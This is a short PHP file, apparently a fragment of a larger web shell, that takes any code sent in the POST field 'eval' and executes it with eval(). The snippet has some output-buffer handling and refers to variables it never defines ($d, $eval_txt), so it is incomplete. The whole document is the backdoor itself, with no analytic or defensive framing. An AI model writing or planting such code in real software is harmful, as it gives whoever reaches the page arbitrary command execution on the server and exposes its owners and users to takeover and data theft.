<?php
$eval = $_POST['eval'];
if (!empty($eval)) 
{ 
    $tmp = ob_get_contents(); 
    $olddir = realpath("."); 
    @chdir($d); 
    if ($tmp) 
    { 
        ob_clean(); 
        eval($eval); 
        $ret = ob_get_contents(); 
        $ret = convert_cyr_string($ret,"d","w"); 
        ob_clean(); 
        echo $tmp; 
        if ($eval_txt) 
        { 
            $rows = count(explode("\r\n",$ret))+1; 
            if ($rows < 10) {
				$rows = 10;
			} 
        } 
    } 
    else 
    { 
        if ($eval_txt) 
        { 
            eval($eval); 
		}
    } 
} 
  
?>